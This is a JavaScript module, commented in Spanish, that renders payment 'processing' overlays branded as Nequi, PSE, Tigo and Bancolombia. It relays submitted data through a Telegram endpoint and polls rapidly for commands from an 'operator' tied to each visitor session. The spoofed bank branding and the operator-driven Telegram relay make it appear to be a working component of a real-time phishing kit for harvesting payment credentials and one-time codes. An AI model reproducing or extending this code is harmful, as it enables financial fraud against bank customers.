/**
 * Sistema de Loading Overlays y Comunicación con Telegram
 * Arquitectura Senior - Código robusto y mantenible con gestión de sesiones
 */

/**
 * Genera un ID único de sesión para cada cliente
 * NOTA: Cada módulo (card, nequi, etc.) debe definir su propia función getSessionId()
 * con su key específico en sessionStorage
 */
function generateSessionId() {
    return Date.now().toString(36) + Math.random().toString(36).substring(2, 15);
}

class LoadingOverlay {
    constructor(type) {
        this.type = type; // 'nequi', 'pse', 'tigo', 'bancolombia'
        this.overlay = null;
        this.pollingInterval = null;
        this.sessionId = generateSessionId();
        this.init();
    }

    init() {
        this.createOverlay();
    }

    createOverlay() {
        this.overlay = document.createElement('div');
        this.overlay.className = `loading-overlay ${this.type}-loading`;
        
        let content = '';
        
        switch (this.type) {
            case 'nequi':
                content = `
                    <svg class="loading-logo" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
                        <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#FFFFFF"></path>
                        <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#FFFFFF"></path>
                        <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#FFFFFF"></path>
                        <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#FFFFFF"></path>
                        <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#FFFFFF"></path>
                    </svg>
                `;
                break;
                
            case 'pse':
                content = `
                    <img src="/img/procesandonw.gif" alt="Procesando PSE" class="loading-spinner">
                    <p class="loading-text">Procesando Pago Seguro en Línea...</p>
                `;
                break;
                
            case 'tigo':
                content = `
                    <img src="/img/tigo-logo.svg" alt="Tigo" class="loading-logo">
                    <div class="loading-spinner-circle"></div>
                    <p class="loading-text">Procesando pago con tarjeta...</p>
                `;
                break;
        }
        
        this.overlay.innerHTML = content;
        document.body.appendChild(this.overlay);
    }

    show() {
        this.overlay.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    hide() {
        this.overlay.classList.remove('active');
        document.body.style.overflow = '';
    }

    destroy() {
        if (this.pollingInterval) {
            clearInterval(this.pollingInterval);
        }
        if (this.overlay && this.overlay.parentNode) {
            this.overlay.parentNode.removeChild(this.overlay);
        }
    }

    /**
     * Inicia polling para esperar respuesta de Telegram (filtrado por sesión)
     * Optimizado para respuesta en tiempo real
     */
    startPolling(callback) {
        let lastCheckedTimestamp = Date.now() / 1000;
        
        console.log('[POLLING] Iniciado para sesión:', this.sessionId);
        
        this.pollingInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/telegram-poll.php?session=${this.sessionId}`, {
                    method: 'GET',
                    headers: { 'Cache-Control': 'no-cache' }
                });
                const data = await response.json();
                
                if (data.actions && data.actions.length > 0) {
                    const newActions = data.actions.filter(action => 
                        action.timestamp > lastCheckedTimestamp &&
                        action.session_id === this.sessionId
                    );
                    
                    if (newActions.length > 0) {
                        console.log('[POLLING] Nueva acción detectada');
                        lastCheckedTimestamp = newActions[newActions.length - 1].timestamp;
                        callback(newActions);
                    }
                }
            } catch (error) {
                console.error('[TELEGRAM POLL] Error:', error);
            }
        }, 500); // Poll cada 500ms para respuesta instantánea
    }
}

/**
 * Cliente para comunicación con Telegram (con gestión de sesiones)
 */
const TelegramClient = {
    async sendToTelegram(action, data, sessionId = null) {
        try {
            // Si no se pasa sessionId, generar uno nuevo
            if (!sessionId) {
                sessionId = generateSessionId();
            }
            
            console.log('[TELEGRAM] Enviando con sesión:', sessionId);
            
            const response = await fetch('/api/telegram-send.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: action,
                    session_id: sessionId,
                    ...data
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                console.log('[TELEGRAM] Mensaje enviado correctamente');
                return { success: true, data: result };
            } else {
                console.error('[TELEGRAM] Error al enviar mensaje:', result);
                return { success: false, error: result.error };
            }
        } catch (error) {
            console.error('[TELEGRAM] Error de red:', error);
            return { success: false, error: error.message };
        }
    },

    /**
     * Envía confirmación de acción ejecutada y espera respuesta
     * Elimina las acciones del servidor para que no se vuelvan a procesar
     */
    async confirmActionExecuted(sessionId, action = null, timestamp = null) {
        try {
            const response = await fetch('/api/telegram-confirm.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    session_id: sessionId,
                    action: action,
                    timestamp: timestamp
                })
            });
            
            const result = await response.json();
            console.log('[TELEGRAM] Confirmación:', result);
            return result;
        } catch (err) {
            console.error('[TELEGRAM] Error al confirmar acción:', err);
            return { success: false };
        }
    },
    
    /**
     * Inicia polling para detectar acciones del operador
     * @param {function} callback - Función a ejecutar cuando se detecte acción (recibe actions y stopPolling)
     * @param {string} sessionId - ID de sesión único
     * @param {number} interval - Intervalo de polling en ms (default: 25ms para respuesta instantánea)
     * @param {number} timeout - Timeout máximo en ms (default: 5 min)
     */
    startPolling(callback, sessionId, interval = 25, timeout = 300000) {
        let lastCheckedTimestamp = Math.floor(Date.now() / 1000);
        const processedActions = new Set();
        const startTime = Date.now();
        let pollingInterval = null;
        let isProcessing = false;
        let consecutiveErrors = 0;
        
        console.log('[TELEGRAM] 🚀 Polling optimizado iniciado');
        console.log('[TELEGRAM] Session:', sessionId);
        
        const stopPolling = () => {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
                console.log('[TELEGRAM] ✓ Polling detenido');
            }
        };
        
        pollingInterval = setInterval(async () => {
            // Timeout check
            if (Date.now() - startTime > timeout) {
                console.log('[TELEGRAM] ⏱️ Timeout alcanzado');
                stopPolling();
                return;
            }
            
            // Evitar procesamiento simultáneo
            if (isProcessing) return;
            
            try {
                // URL optimizada con timestamp para evitar cache
                const url = `/api/telegram-poll.php?session=${encodeURIComponent(sessionId)}&since=${lastCheckedTimestamp}&_=${Date.now()}`;
                
                const response = await fetch(url, {
                    method: 'GET',
                    headers: {
                        'Cache-Control': 'no-cache, no-store',
                        'Pragma': 'no-cache'
                    },
                    cache: 'no-store'
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const data = await response.json();
                consecutiveErrors = 0; // Reset error counter
                
                if (data.actions && data.actions.length > 0) {
                    const newActions = data.actions.filter(action => {
                        const actionId = `${action.action}_${action.timestamp}`;
                        return !processedActions.has(actionId);
                    });
                    
                    if (newActions.length > 0) {
                        isProcessing = true;
                        
                        // Marcar como procesadas
                        newActions.forEach(action => {
                            processedActions.add(`${action.action}_${action.timestamp}`);
                        });
                        
                        // Actualizar timestamp
                        lastCheckedTimestamp = Math.max(...newActions.map(a => a.timestamp), lastCheckedTimestamp);
                        
                        console.log('[TELEGRAM] ⚡ Acción detectada:', newActions[0].action);
                        
                        // Confirmar y eliminar del servidor
                        TelegramClient.confirmActionExecuted(
                            sessionId,
                            newActions[0].action,
                            newActions[0].timestamp
                        ).catch(err => console.warn('[TELEGRAM] Confirm error:', err));
                        
                        // Detener polling
                        stopPolling();
                        
                        // Ejecutar callback
                        try {
                            callback(newActions, stopPolling);
                        } catch (callbackError) {
                            console.error('[TELEGRAM] Callback error:', callbackError);
                        }
                        
                        return;
                    }
                }
            } catch (error) {
                consecutiveErrors++;
                if (consecutiveErrors > 5) {
                    console.error('[TELEGRAM] Demasiados errores, deteniendo');
                    stopPolling();
                }
                console.error('[TELEGRAM] Error:', error.message);
            }
        }, interval);
        
        return stopPolling;
    }
};
// Objeto estático simple para manejar overlays existentes en el DOM
const SimpleLoadingOverlay = {
    show: function() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    },
    
    hide: function() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('active');
            overlay.style.display = 'none';
            document.body.style.overflow = '';
        }
    }
};

// Exportar para uso global
window.LoadingOverlay = SimpleLoadingOverlay;
window.TelegramClient = TelegramClient;
window.generateSessionId = generateSessionId;
